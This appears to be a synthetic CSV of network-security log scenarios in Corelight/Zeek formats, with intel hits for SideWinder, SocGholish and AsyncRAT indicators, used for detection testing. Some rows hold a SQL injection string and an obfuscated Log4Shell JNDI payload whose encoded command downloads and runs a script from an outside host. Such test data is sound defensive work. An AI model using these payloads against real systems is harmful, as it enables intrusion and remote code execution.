scenarioID,logName,src_ip,src_port,dest_ip,dest_port,proto,service,bytes_seen,bytes_out,timeModifier,userAgent,scanInternal,scanDMZ,alertName,success,answer,value,referrer,idsID,intelSource,query,intelTags,description,firstSeen,indicatorType,mime_type,fileDescription
AnPvJh4gesTy7Vgf/TfYyw==,corelight_conn,134.20.5.14,19872,10.10.10.29,1433,tcp,sql,,,44,,,,,,,,,,,,,,,,,
AnPvJh4gesTy7Vgf/TfYyw==,corelight_tds,134.20.5.14,19872,10.10.10.29,1433,tcp,sql,,,47,,,, SELECT * FROM Users WHERE UserId = 105 OR 1=1,,,,,,,,,,,,,
rM57JPQ+2B3jILYVEwGM6w==,corelight_conn,134.20.5.14,22287,10.1.1.3,3389,tcp,rdp,,,50,,,,,,,,,,,,,,,,,
rM57JPQ+2B3jILYVEwGM6w==,corelight_rdp,134.20.5.14,22287,10.1.1.3,3389,tcp,rdp,,,50,,,,,yes,,,,,,,,,,,,
U4sjxO57tVkhzyEbe4HjSg==,corelight_notice,134.20.5.14,50232,10.1.1.3,55453,tcp,,,,55,,,,ATTACK::Credential_Access,,,1,,,,,,,,,,
AWxv7/6YAK2xbVdYYEWcjA==,corelight_conn,10.10.10.20,36844,172.32.150.225,80,tcp,http,7902,3409,30,,,,,,,,,,,,,,,,,
AWxv7/6YAK2xbVdYYEWcjA==,corelight_intel,10.10.10.20,36844,172.32.150.225,80,tcp,Files::IN_HASH,alienvault_otx,#ref:https://blog.group-ib.com/sidewinder-antibot,30,,7/7/2022,sidewinder~apt~pakistan,Intel::FILE_HASH,application/octet-stream,~wnotification003.tmp,6a99ce5387c5b67602b2ef633bfbdc184e4d845c,,,,,,,,,,
AWxv7/6YAK2xbVdYYEWcjA==,corelight_http,10.10.10.20,36844,172.32.150.225,80,tcp,http,7902,3409,30,Mozilla/5.0,,,,,,,,,,,,,,,,
AWxv7/6YAK2xbVdYYEWcjA==,corelight_files,10.10.10.20,36844,172.32.150.225,80,tcp,http,7902,3409,30,,,,,,,6a99ce5387c5b67602b2ef633bfbdc184e4d845c,,,,,,,,,,
35a+h1hpGd0XxO1ttndotg==,corelight_conn,10.10.10.20,39656,10.10.1.5,53,udp,dns,154,10,29,,,,,,,,,,,,,,,,,
35a+h1hpGd0XxO1ttndotg==,corelight_dns,10.10.10.20,39656,10.10.1.5,53,udp,dns,154,10,29,,,,,,172.32.150.225,malwaresample.net,,,,,,,,,,
u+nIiVvk81RF7PQMjiBlsw==,estreamer,134.20.5.1,29392,134.20.5.2,80,tcp,http,,,0,,,,,FALSE,,1,,,,,,,,,,
MRy5hEViEXyhJEoG2GGfwg==,estreamer,134.20.5.3,29393,134.20.5.4,80,tcp,http,,,0,,,,,FALSE,,2,,,,,,,,,,
TUlhb1tEWM/Y5KkN6+qEgQ==,estreamer,134.20.5.4,29394,134.20.5.6,8400,tcp,http,,,0,,,,,TRUE,,3,,,,,,,,,,
TUlhb1tEWM/Y5KkN6+qEgQ==,corelight_conn,134.20.5.4,29394,134.20.5.6,8400,tcp,http,,,0,,,,,,,,,,,,,,,,,
TUlhb1tEWM/Y5KkN6+qEgQ==,corelight_http,134.20.5.4,29394,134.20.5.6,8400,tcp,http,,,0,python requests,,,,,,,,,,,,,,,,
gvrLvVD1JRYfYRbTEKyM0g==,corelight_intel,10.10.10.21,44444,10.10.1.5,53,udp,DNS::IN_REQUEST,alienvault_otx,#ref:https://medium.com/walmartglobaltech/socgholish-campaigns-and-initial-access-kit-4c4283fea8ee;,15,,5/25/2022,fake-updates~socgholish,Intel::DOMAIN,,,payyourintern.com,,,,,,,,,,
gvrLvVD1JRYfYRbTEKyM0g==,corelight_dns,10.10.10.21,44444,10.10.1.5,53,udp,dns,,,15,,,,,,,payyourintern.com,,,,,,,,,,
gvrLvVD1JRYfYRbTEKyM0g==,corelight_conn,10.10.10.21,44444,10.10.1.5,53,udp,dns,,,15,,,,,TRUE,,,,,,,,,,,,
vRdH2GsvkZUZAo5pefiBvA==,corelight_conn,195.54.160.49,9765,134.20.5.14,80,tcp,http,10,12,1,,,,,TRUE,200,,,,,,,,,,,
vRdH2GsvkZUZAo5pefiBvA==,corelight_http,195.54.160.49,9765,134.20.5.14,80,tcp,http,101,12,1,${${::=j}${::=n}${::=d}${::=i}:${::=l}${::=d}${::=a}${::=p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xO%guNzEuMjQ3Ljkx0jgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0Oto1ODc0LzE5OC43MS4yNDcuOTE60DApfGJhc2g=},,,corelight_http,TrueTrue,200,/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xO%guNzEuMjQ3Ljkx0jgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0Oto1ODc0LzE5OC43MS4yNDcuOTE60DApfGJhc2g=},,,,,,,,,,
NRY4xKVCxdCNfLzyx525pw==,corelight_conn,134.20.5.14,8767,195.54.160.49,80,tcp,http,512,12,1,,,,,TRUE,0,,,,,,,,,,,
NRY4xKVCxdCNfLzyx525pw==,corelight_files,134.20.5.14,8767,195.54.160.49,80,tcp,http,512,12,1,,,,,TRUE,0,f0bfa5f33ab4b29a6fdd52473ee7b834d,,,,,,,,,,
QLPMcOgDubrAIuEea/yslQ==,corelight_conn,195.54.160.49,9766,134.20.5.15,80,tcp,http,10,12,0,,,,,TRUE,404,,,,,,,,,,,
QLPMcOgDubrAIuEea/yslQ==,corelight_http,195.54.160.49,9766,134.20.5.15,80,tcp,http,101,12,0,${${::=j}${::=n}${::=d}${::=i}:${::=l}${::=d}${::=a}${::=p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xO%guNzEuMjQ3Ljkx0jgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0Oto1ODc0LzE5OC43MS4yNDcuOTE60DApfGJhc2g=},,,corelight_http,TRUE,404,/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xO%guNzEuMjQ3Ljkx0jgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0Oto1ODc0LzE5OC43MS4yNDcuOTE60DApfGJhc2g=},,,,,,,,,,
Y4lo2Y6GCwZkbpLZJx5WQ==,corelight_conn,10.10.10.21,4371,10.10.1.5,53,udp,dns,47,26,0,,,,,,,,,,,,,,,,,
Y4lo2Y6GCwZkbpLZJx5WQ==,corelight_dns,10.10.10.21,4371,10.10.1.5,53,udp,dns,47,26,0,,,,,,172.32.150.225,myanscestry.com,,,,,,,,,,
TdbKSa7kf+c6J4J2aR1Y4A==,corelight_conn,10.10.10.21,5144,172.32.150.225,80,tcp,http,4620,65433,1,,,,,,,,,,,,,,,,,
TdbKSa7kf+c6J4J2aR1Y4A==,corelight_http,10.10.10.21,5144,172.32.150.225,80,tcp,http,4620,65433,1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,,,,,200,/aboutus,,,,,,,,,,
l7iQnTWcq2Apg9hFVDjX+Q==,corelight_conn,10.10.10.21,5932,103.136.43.17,80,tcp,http,34,5323525,2,,,,,,,,,,,,,,,,,
l7iQnTWcq2Apg9hFVDjX+Q==,corelight_http,10.10.10.21,5932,103.136.43.17,80,tcp,http,34,5323525,2,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,,,,,200,/,http://myanscestry.com/aboutus,,,,,,,,,
l7iQnTWcq2Apg9hFVDjX+Q==,corelight_files,10.10.10.21,5932,103.136.43.17,80,tcp,http,34,5323525,2,,,,,application/x-dosexec,,b9d5af76d8df1c4ee4ccba33b2afa8300952d923,,,,,,,,,,
l7iQnTWcq2Apg9hFVDjX+Q==,corelight_intel,10.10.10.21,5932,103.136.43.17,80,tcp,Files::IN_HASH,alienvault_otx,#ref:https://jstnk9.github.io/jstnk9/research/AsyncRAT-Analysis/;,2,,6/2/2022,asyncrat~colombia,Intel::FILE_HASH,application/x-dosexec,System.Data.SQLite.dll,b9d5af76d8df1c4ee4ccba33b2afa8300952d923,,,,,,,,,,
m5iQnJVcq2Apg9hAVEjX+Q==,ping_scan,10.10.10.21,6666,,0,icmp,,,,5,,TRUE,FALSE,,,,,,,,,,,,,,
def,bacnet,10.10.10.23,47808,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,COMPLEX_ACK,,,,,,,,,,
def,bacnet,10.10.10.23,47809,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,CONFIRMED_REQUEST,,,,,,,,,,
def,bacnet,10.10.10.23,47810,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,NPDU,,,,,,,,,,
def,bacnet,10.10.10.23,47811,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,SIMPLE_ACK,,,,,,,,,,
def,bacnet,10.10.10.23,47812,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,UNCONFIRMED_REQUEST,,,,,,,,,,
def,bacnet,10.10.10.23,47813,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,SIMPLE_ACK,,,,,,,,,,
def,bacnet,10.10.10.23,47814,10.10.10.24,47808,tcp,bacnet,48285184,4924151,5,,,,,,,NPDU,,,,,,,,,,
abc,bacnet,11.34.12.17,48114,10.10.10.24,47808,tcp,bacnet,1521,99872,10,,,,,,,CONFIRMED_REQUEST,,,,,,,,,,
